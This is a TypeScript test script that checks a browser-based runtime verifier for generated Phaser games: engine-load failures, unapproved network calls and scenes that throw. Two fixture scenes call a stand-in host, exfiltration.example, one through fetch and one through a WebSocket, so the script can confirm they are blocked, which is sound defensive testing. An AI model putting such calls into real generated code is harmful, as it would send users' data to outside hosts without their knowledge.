/**
 * Real-browser checks for the server-side runtime verifier.
 *
 *   pnpm verify:runtime
 *
 * Confirms that a working Phaser scene passes and that a scene throwing at
 * runtime is rejected — the failure mode that structural HTML validation and
 * `node --check` cannot see. It also measures the case that generated games hit
 * on a machine that cannot reach the approved CDN (KI-53): the engine never
 * loads, and the verifier has to refuse the artifact *and say why*.
 *
 * Exit codes: 0 passed, 1 a verifier defect, 2 the environment cannot run the
 * reachable-engine case because the approved CDN is unreachable. A blocked
 * environment must not be reported as a product failure, and a passing offline
 * case must not be read as proof that games work without network.
 */
import {
  checkGameRuntime,
  isAllowedRuntimeRequest,
} from '../apps/server/src/forge/runtime-check.js';

const CDN = 'https://cdn.jsdelivr.net/npm/phaser@3.80.1/dist/phaser.min.js';
/**
 * The approved host on port 1. The allowlist matches scheme and hostname only,
 * so the verifier permits this load and hands it to the browser, which refuses
 * to attempt an unsafe port at all. That is a deterministic, no-egress way to
 * produce "a load the allowlist permitted came back failed" — what matters for
 * the verifier's report is that a permitted load failed, not which reason the
 * network layer gave, and a real no-egress machine shows the same shape with a
 * different reason string (`ERR_NAME_NOT_RESOLVED`, `ERR_CONNECTION_RESET`).
 */
const CDN_PERMITTED_AND_FAILED = 'https://cdn.jsdelivr.net:1/npm/phaser@3.80.1/dist/phaser.min.js';

function game(scene: string, engine = CDN): string {
  return `<!doctype html><html><head>
<script src="${engine}"></script></head><body><div id="game"></div>
<script>
new Phaser.Game({ type: Phaser.AUTO, width: 480, height: 320, parent: 'game', backgroundColor: '#ffe08a',
  scene: { create() { const g = this.add.graphics(); g.fillStyle(0xff5d5d, 1); g.fillRect(20, 20, 120, 80); ${scene} } } });
</script></body></html>`;
}

const checks: string[] = [];
function pass(what: string, detail = ''): void {
  checks.push(what);
  console.log(`  ok  ${what}${detail ? ` (${detail})` : ''}`);
}

async function main() {
  // The engine is only reachable if the verifier lets the request out at all.
  if (!isAllowedRuntimeRequest(CDN)) throw new Error('the approved CDN is not allowlisted');
  if (!isAllowedRuntimeRequest(CDN_PERMITTED_AND_FAILED)) {
    throw new Error('the unreachable-port stand-in is not treated as an allowed origin');
  }

  // 1. Engine permitted but unreachable: the artifact must be refused, and the
  //    report must name the host rather than leaving "Phaser is not defined" as
  //    the only clue. This case runs with no egress at all.
  const offline = await checkGameRuntime(
    game('this.add.text(40, 200, "ok", { color: "#222" });', CDN_PERMITTED_AND_FAILED),
    15_000,
  );
  console.log('engine load refused:', JSON.stringify(offline.errors));
  if (offline.ok) throw new Error('a game whose engine could not load passed runtime verification');
  if (offline.canvas) throw new Error('a game with no engine reported a canvas');
  if (offline.remote_failures.length === 0) {
    throw new Error('a permitted load that the network refused was not named as a remote failure');
  }
  if (!offline.remote_failures.some((line) => line.includes('https://cdn.jsdelivr.net'))) {
    throw new Error(
      `the refusal does not name the approved CDN origin: ${offline.remote_failures.join(' | ')}`,
    );
  }
  if (!offline.errors.some((line) => line.includes('https://cdn.jsdelivr.net'))) {
    throw new Error('the user-visible errors do not name the host the game could not reach');
  }
  if (offline.errors.some((line) => line.includes('phaser.min.js'))) {
    throw new Error(`the report leaked the engine path: ${offline.errors.join(' | ')}`);
  }
  if (offline.blocked.length > 0) {
    throw new Error(
      `the unreachable-approved-host case reported blocked requests: ${offline.blocked.join(', ')}`,
    );
  }
  pass(
    'a game whose engine cannot load is refused, and the refusal names the approved CDN origin',
    offline.remote_failures[0]?.slice(0, 96),
  );

  // 2. Reachable engine: the first case that needs the CDN to answer, and the
  //    switch for everything below it. If the CDN does not answer, that is an
  //    environment limit and the run says so instead of reporting a verifier
  //    defect — the remaining cases all assume the engine actually loaded.
  const good = await checkGameRuntime(game('this.add.text(40, 200, "ok", { color: "#222" });'));
  if (!good.ok) {
    if (good.remote_failures.length > 0) {
      console.log(
        '\nBLOCKED: the approved CDN is unreachable from this machine, so the reachable-engine case cannot be measured.',
      );
      console.log(`  ${good.remote_failures.join('\n  ')}`);
      console.log(
        '  cases skipped because they need the engine to load: unapproved origin, unapproved',
      );
      console.log('  WebSocket, scene-that-throws, and the working-scene control itself.');
      console.log(`offline checks that did run: ${checks.length}`);
      process.exit(2);
    }
    throw new Error(
      `valid Phaser scene did not pass runtime verification: ${good.errors.join(' | ')}`,
    );
  }
  if (good.blocked.length > 0) throw new Error('valid scene had requests blocked');
  if (good.remote_failures.length > 0) {
    throw new Error(
      `a scene that rendered reported a failed load: ${good.remote_failures.join(' | ')}`,
    );
  }
  pass(
    'a working Phaser scene passes, which also proves the game engine is a network dependency',
    good.browser ?? '',
  );

  // 3. A scene that phones home is still refused, and a request the allowlist
  //    *rejected* must never be dressed up as a permitted load that failed.
  const exfiltration = await checkGameRuntime(
    game('fetch("https://exfiltration.example/collect").catch(function () {});'),
  );
  if (exfiltration.ok) throw new Error('a scene calling an unapproved origin passed verification');
  if (!exfiltration.blocked.some((url) => url.includes('exfiltration.example'))) {
    throw new Error('unapproved request was not recorded as blocked');
  }
  if (exfiltration.remote_failures.length > 0) {
    throw new Error(
      `a blocked host was reported as a permitted failure: ${exfiltration.remote_failures.join(' | ')}`,
    );
  }
  pass('an unapproved origin is blocked, and blocking is never reported as a permitted failure');

  const websocket = await checkGameRuntime(
    game(
      'try { var s = new WebSocket("wss://exfiltration.example/socket"); s.onerror = function () {}; } catch (error) {}',
    ),
  );
  if (websocket.ok) throw new Error('a scene opening an unapproved WebSocket passed verification');
  if (!websocket.blocked.some((url) => url.includes('wss://exfiltration.example'))) {
    throw new Error('unapproved WebSocket was not recorded as blocked');
  }
  pass('an unapproved WebSocket is closed and recorded');

  // 4. A scene whose engine loads and then throws is refused for throwing,
  //    not for its network.
  const broken = await checkGameRuntime(game('g.fillStar(80, 80, 5, 30, 30);'));
  if (broken.ok) throw new Error('broken Phaser scene passed runtime verification');
  if (broken.remote_failures.length > 0) {
    throw new Error(
      `an engine failure was reported for a scene whose engine loaded: ${broken.remote_failures.join(' | ')}`,
    );
  }
  pass('a scene that throws after the engine loads is refused, without blaming the CDN');

  console.log(`runtime verification: PASS (${checks.length} checks)`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
